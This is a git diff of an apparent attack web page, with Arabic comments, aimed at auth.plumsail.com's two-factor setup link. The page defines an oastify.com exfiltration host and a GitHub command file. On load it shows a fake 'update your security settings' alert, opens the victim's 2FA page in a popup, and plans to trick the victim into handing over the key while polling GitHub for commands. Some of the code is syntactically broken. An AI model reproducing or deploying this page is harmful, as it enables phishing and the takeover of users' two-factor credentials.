@@ -18,23 +18,19 @@
         const githubCmd = "https://raw.githubusercontent.com/mohamed-talaat0/AttackerWeb/refs/heads/main/cmd.json";
         const burpExfil = "https://88erdfpo5whuhkv0fqqoo6e9m0srgm4b.oastify.com";
 
-        async function leakData() {
-            try {
-        // محاولة سحب البيانات كـ Blob لتجاوز تدقيق النوع
-                let response = await fetch("https://auth.plumsail.com/api/account/users/manage/2fa/link", {
-                mode: 'cors', // جرب تغييرها لـ 'no-cors' وشاهد الـ Network
-                credentials: 'include'
-        });
-        
-        // إذا استمر الـ CORS في المنع، فالحل الوحيد هو "الخداع البصري"
-        // سنفتح نافذة منبثقة (Popup) للموقع الحقيقي ونطلب من المستخدم فعل شيء
-                let win = window.open("https://auth.plumsail.com/api/account/users/manage/2fa/link", "victim_win", "width=1,height=1");
-        
-        // ملاحظة: المتصفح سيمنع win.document.body.innerHTML بسبب SOP
-        // لكنك حصلت على الـ Key في الصورة، هل الـ Key ثابت لكل المستخدمين؟
-        // إذا كان الـ Key يتغير، فأنت تحتاج للضحية أن يرسل لك الـ Key يدوياً عبر "خدعة"
-        } catch (e) {}
-        }, 3000);
+        async function startAttack() {
+    // المرحلة 1: فتح صفحة الكود للضحية في نافذة جديدة (Popup)
+    // المتصفح سيطلب من الضحية السماح بالـ Popup، لذا اجعلها نتيجة "ضغطة زر"
+                alert("اضغط موافق لتحديث إعدادات الأمان الخاصة بك");
+                let victimWin = window.open("https://auth.plumsail.com/api/account/users/manage/2fa/link", "_blank", "width=500,height=500");
+
+    // المرحلة 2: بما أننا لا نستطيع قراءة محتوى victimWin، سنطلب من الضحية "نسخه"
+    // أو سنقوم بمراقبة الـ Clipboard إذا كان المتصفح قديماً، 
+    // لكن الأفضل هو الانتظار حتى تضع أنت الرابط في جيت هب يدوياً بعد رؤيته
+    
+                console.log("Waiting for manual command from GitHub...");
+                monitorGitHub(); 
+            }, 3000);
         }
 
         window.onload = startAttack;
